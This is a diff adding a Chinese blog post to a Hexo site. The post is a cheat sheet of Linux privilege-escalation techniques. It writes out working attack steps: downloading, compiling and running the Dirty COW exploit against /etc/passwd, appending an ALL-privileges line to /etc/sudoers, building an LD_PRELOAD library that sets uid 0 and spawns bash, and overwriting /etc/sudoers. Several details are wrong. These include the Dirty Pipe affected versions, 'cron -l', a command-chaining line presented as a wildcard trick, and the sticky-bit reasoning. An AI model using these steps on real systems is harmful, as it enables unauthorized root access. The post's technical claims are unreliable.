@@ -1,0 +1,149 @@
+<!DOCTYPE html>
+<html lang="zh">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="renderer" content="webkit">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+    <meta name="google-site-verification" content="TZE0rZyIqLl10trYu3BWBWa1Vmz6HFwhb2OcNEK4u-s" />
+     <link rel="shortcut icon" href= /img/clown.svg >
+    <title>
+        Clown
+    </title>
+    <meta name="description" content= IS IT JUST ME OR IS IT GETTING CRAZIER OUT THERE? >
+    <meta name="keywords" content= Blog,Hexo,Theme,Clown,ME >
+    
+<link rel="stylesheet" href="/libs/highlight/styles/monokai-sublime.css">
+
+    
+<link rel="stylesheet" href="/libs/font-awesome/css/font-awesome.min.css">
+
+    
+<link rel="stylesheet" href="/css/style.css">
+
+<meta name="generator" content="Hexo 6.3.0"></head>
+<body id="bodyx">
+    <div class="hd posts">
+    <a href="/index.html"><i class="fa fa-home
+ replay-btn" aria-hidden="true"></i></a>
+    <div class="post-title">
+        <p>
+            提权总结
+        </p>
+        <hr>
+    </div>
+    <div class="post-content">
+        <h1 id="提权总结"><a href="#提权总结" class="headerlink" title="提权总结"></a>提权总结</h1><p><strong>注</strong>：再linux中可以直接利用linEnum进行枚举 地址:<a target="_blank" rel="noopener" href="https://github.com/rebootuser/LinEnum">https://github.com/rebootuser/LinEnum。</a></p>
+<h2 id="Linux提权手法"><a href="#Linux提权手法" class="headerlink" title="Linux提权手法"></a>Linux提权手法</h2><h3 id="1-利用SUID可执行文件"><a href="#1-利用SUID可执行文件" class="headerlink" title="1#-利用SUID可执行文件"></a>1#-利用SUID可执行文件</h3><p>​	SUID（Set-User-Id）是Linux中的特殊权限，文件属性为-rwsr-xr-x,即拥有s属性的可执行文件会以文件的拥有者的权限进行执行，而不需要文件执行者的权限执行。它可以被用于提升权限。以下的示例中，passwd二进制文件设置了SUID位，这意味着它以root用户的权限运行，由此可以直接通过修改passwd二进制文件来创建一个具有管理员权限的新用户账户。</p>
+<p>![image-20230410105924413](Linux 提权总结\image-20230410105924413.png)</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#此命令将列出系统上的所有SUID二进制文件</span></span><br><span class="line">find / -perm -u=s -<span class="built_in">type</span> f 2&gt;/dev/null </span><br></pre></td></tr></table></figure>
+
+<h3 id="2-利用内核"><a href="#2-利用内核" class="headerlink" title="2#-利用内核"></a>2#-利用内核</h3><p>Linux中的内核漏洞，可以被用来提升权限。这些漏洞可以用于绕过安全机制并或者对常用受限资源的访问权限。</p>
+<p>例如：Dirty Cow 漏洞 产自2016 </p>
+<p>原理：通过利用Linux内核的写时复制机制中的竞争条件类获取root权限。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo wget https://raw.githubusercontent.com/dirtycow/dirtycow.github.io/master/dirtyc0w.c</span><br><span class="line">gcc -pthread dirtyc0w.c -o dirtyc0w</span><br><span class="line">./dirtyc0w /etc/passwd foo</span><br></pre></td></tr></table></figure>
+
+<p>例如：Dirty Pipe 漏洞 产自 2022  </p>
+<p>影响：5.8以前</p>
+<p>原理：flag成员在 Linux 内核中缺乏适当的初始化<code>copy_page_to_iter_pipe</code>和功能的方式的缺陷，因此可能包含陈旧的值。<code>push_pipe</code>非特权本地用户	可以利用此缺陷写入由只读文件支持的页面缓存中的页面，从而提升他们在系统上的权限。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://www.exploit-db.com/exploits/50808</span><br></pre></td></tr></table></figure>
+
+<p>检查内核版本，直接利用searchsploit 工具搜索漏洞</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">uname -r</span><br><span class="line">searchsploit kernel &lt;version&gt;</span><br></pre></td></tr></table></figure>
+
+<h3 id="3-利用Cron作业"><a href="#3-利用Cron作业" class="headerlink" title="3#-利用Cron作业"></a>3#-利用Cron作业</h3><p>简介：Cron是Linux中的定时任务&#x2F;计划任务，利用这些任务可以进行权限提升。</p>
+<p>例如：目标服务器存在一个Cron，如何这个Cron是以管理员权限运行 并且能够以用户权限进行修改，我们就可以对其进行修改，当运行时即可获取相应权限了。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">#列出cron 列表，可以用于查看是否存在潜在的权限提升漏洞</span><br><span class="line">cron -l</span><br><span class="line">#还要检查你是否具有对以下任何文件的写入权限</span><br><span class="line">/etc/init.d</span><br><span class="line">/etc/cron*</span><br><span class="line">/etc/crontab</span><br><span class="line">/etc/cron.allow</span><br><span class="line">/etc/cron.d</span><br><span class="line">/etc/cron.deny</span><br><span class="line">/etc/cron.daily</span><br><span class="line">/etc/cron.hourly</span><br><span class="line">/etc/cron.monthly</span><br><span class="line">/etc/cron.weekly</span><br><span class="line">/etc/sudoers</span><br><span class="line">/etc/exports</span><br><span class="line">/etc/anacrontab</span><br><span class="line">/var/spool/cron</span><br><span class="line">/var/spool/cron/crontabs/root</span><br></pre></td></tr></table></figure>
+
+<h3 id="4-利用sudo配置"><a href="#4-利用sudo配置" class="headerlink" title="4#-利用sudo配置"></a>4#-利用sudo配置</h3><p>简介：普通的Sudo命令，允许运用以提升的权限运行此命令。如何可以修改&#x2F;etc&#x2F;sudoers，即可用于提升权限。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#此命令可以用于显现当前用户的sudo权限，可以用于查看受否存在潜在的权限提升漏洞</span><br><span class="line">sudo -l</span><br><span class="line">#如果存在以下显示，则说明sudoers配置文件错误，运行用户以任何用户身份运行任何命令，包括root。</span><br><span class="line"> (ALL : ALL) ALL</span><br><span class="line">#直接利用，前提/etc/sudoers可写</span><br><span class="line">sudo echo &quot;zsmbrax ALL=(ALL:ALL) ALL&quot; &gt;&gt; /etc/sudoers </span><br></pre></td></tr></table></figure>
+
+<h3 id="5-利用环境"><a href="#5-利用环境" class="headerlink" title="5#-利用环境"></a>5#-利用环境</h3><p>​	简介：**<code>LD_PRELOAD</code>**是个环境变量，用于动态库的加载，动态库加载的优先级最高。动态库的加载顺序如下：</p>
+<ul>
+<li><strong>1. <code>LD_PRELOAD</code></strong></li>
+<li><strong>2. <code>LD_LIBRARY_PATH</code></strong></li>
+<li><strong>3. <code>/etc/ld.so.cache</code></strong></li>
+<li><strong>4. <code>/lib</code></strong></li>
+<li><strong>5. <code>/usr/lib</code></strong></li>
+</ul>
+<p>在 <code>UNIX</code> 的动态链接库的世界中，<code>LD_PRELOAD</code> 就是这样一个环境变量，它可以影响程序的运行时的链接(<code>Runtime linker</code>)它允许你定义在程序运行前优先加载的动态链接库。这个功能主要就是用来有选择性的载入不同动态链接库中的相同函数。</p>
+<p>我们可以将 LD_PRELOAD 环境变量设置为恶意库，该库将由以提升权限运行的程序加载。</p>
+<p>1）创建一个恶意共享对象库，例如创建一个新文件并将其命名为 priv_esc.c</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">#此代码将有效用户 ID 设置为 0（root），然后执行 Bash shell。</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;sys/types.h&gt;</span><br><span class="line">#include &lt;unistd.h&gt;</span><br><span class="line">void __attribute__ ((constructor)) init(void) &#123;</span><br><span class="line"> setuid(0);</span><br><span class="line"> system(&quot;/bin/bash&quot;);</span><br><span class="line">&#125;</span><br><span class="line">#编译</span><br><span class="line">gcc -fPIC -shared -o priv_esc.so priv_esc.c</span><br><span class="line">#导入环境变量</span><br><span class="line">export LD_PRELOAD=/path/to/priv_esc.so</span><br><span class="line">#运行具有提升权限的命令</span><br></pre></td></tr></table></figure>
+
+<h3 id="6-利用Sudo权限"><a href="#6-利用Sudo权限" class="headerlink" title="6#-利用Sudo权限"></a>6#-利用Sudo权限</h3><p>简介：文件或目录路径中使用通配符，例如*，如果具有sudo权限的命令或脚本允许用户指定包含通配符的路径，就可以利用它来提升权限。</p>
+<p>例如：以下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo rm -rf /path/to/directory/* </span><br><span class="line">#用户如果能够指定目录路径，则它们可以通过指定包含通配符的路径以root用户执行任意命令</span><br><span class="line">sudo rm -rf /path/to/directory/*; whoami</span><br></pre></td></tr></table></figure>
+
+<h3 id="7-利用错误配置的NFS导出"><a href="#7-利用错误配置的NFS导出" class="headerlink" title="7#-利用错误配置的NFS导出"></a>7#-利用错误配置的NFS导出</h3><p>简介：如果系统正在使用NFS（网络文件系统），并且管理员错误配置了NFS导出，我们可以挂载NFS共享并使用提升的权限修改文件。</p>
+<p>例如：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#找查可访问的NFS共享</span><br><span class="line">showmount -e &lt;ip_address&gt;</span><br></pre></td></tr></table></figure>
+
+<h3 id="8-LXD-x2F-LXC容器"><a href="#8-LXD-x2F-LXC容器" class="headerlink" title="8#-LXD&#x2F;LXC容器"></a>8#-LXD&#x2F;LXC容器</h3><p>LXD&#x2F;LXC 容器是轻量级虚拟化技术，可用于隔离进程和应用程序。但是，如果容器配置错误或存在漏洞，我们可以逃离容器并获得对主机系统的访问权限。要查找配置错误的容器，我们可以使用 LXD-PRivesc 或 LXD-Exploit 等工具。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/initstring/lxd_root</span><br></pre></td></tr></table></figure>
+
+<h3 id="9-利用粘滞位"><a href="#9-利用粘滞位" class="headerlink" title="9#-利用粘滞位"></a>9#-利用粘滞位</h3><p>简介：粘滞位是一个属性，用于只允许文件或目录的所有者删除或则重命名文件。但是如果用户可以在特权用户的目录中创建一个设置了粘滞位的文件，就可以用于提升权限。</p>
+<p>例如：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#检查设置了粘滞位的目录</span><br><span class="line">find / -perm -1000 -type d 2&gt;/dev/null</span><br><span class="line">#定位文件权限弱的目录</span><br><span class="line">find / -perm -1000 -type d -exec ls -ld &#123;&#125; \; | awk &#x27;&#123;print $1,$3,$4,$NF&#125;&#x27;</span><br><span class="line">#在目录中创建带有粘滞位的文件</span><br><span class="line">touch /path/to/directory/file.txt; chmod +t /path/to/directory/file.txt</span><br><span class="line">#利用粘滞位替身权限</span><br><span class="line">mv /path/to/directory/file.txt /etc/sudoers</span><br></pre></td></tr></table></figure>
+
+
+    </div>
+
+    
+</div>
+    <div class="footer" id="footer">
+    <p><h4>Copyright © 2020 | Author: Clown | Theme By <a class="theme-author" target="_blank" rel="noopener" href="https://github.com/Xunzhuo/hexo-theme-coder" style="font-size:14px; color: #969696">Coder</a></h4>
+    
+        <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+        <span id="busuanzi_container_site_pv">Page Views: <span id="busuanzi_value_site_pv"></span></span>
+        <span class="post-meta-divider">|</span>
+        <span id="busuanzi_container_site_uv">Unique Visitors: <span id="busuanzi_value_site_uv"></span></span>
+    
+    <label class="el-switch el-switch-blue el-switch-sm" style="vertical-align: sub;">
+        <input type="checkbox" name="switch" id="update_style">
+        <span class="el-switch-style"></span>
+    </label>
+
+    <!--         <script type="text/javascript">
+    var cnzz_protocol = (("https:" == document.location.protocol) ? "https://" : "http://");
+    document.write(unescape("%3Cspan id='cnzz_stat_icon_1278548644'%3E%3C/span%3E%3Cscript src='" + cnzz_protocol + "v1.cnzz.com/stat.php%3Fid%3D1278548644%26show%3Dpic1' type='text/javascript'%3E%3C/script%3E"));
+    </script> -->
+</p>
+</div>
+
+<input type="hidden" id="web_style" value="black">
+<input type="hidden" id="valine_appid" value="">
+<input type="hidden" id="valine_appKey" value="">
+
+<script src="/libs/jquery.min.js"></script>
+
+
+<script src="/libs/highlight/highlight.pack.js"></script>
+
+<script src='//cdn.jsdelivr.net/npm/valine@1.3.10/dist/Valine.min.js'></script>
+
+<script src="/js/js.js"></script>
+
+<style type="text/css">
+.v * {
+color: #698fca;
+}
+.v .vlist .vcard .vhead .vsys {
+color: #3a3e4a;
+}
+.v .vlist .vcard .vh .vmeta .vat {
+color: #638fd5;
+}
+.v .vlist .vcard .vhead .vnick {
+color: #6ba1ff;
+}
+.v a {
+color: #8696b1;
+}
+.v .vlist .vcard .vhead .vnick:hover {
+color: #669bfc;
+}
+</style>
+    <script type="text/javascript" color="173,174,173" opacity='1' zIndex="-2" count="99" src="//cdn.bootcss.com/canvas-nest.js/1.0.0/canvas-nest.min.js"></script>
+</body>
+</html>
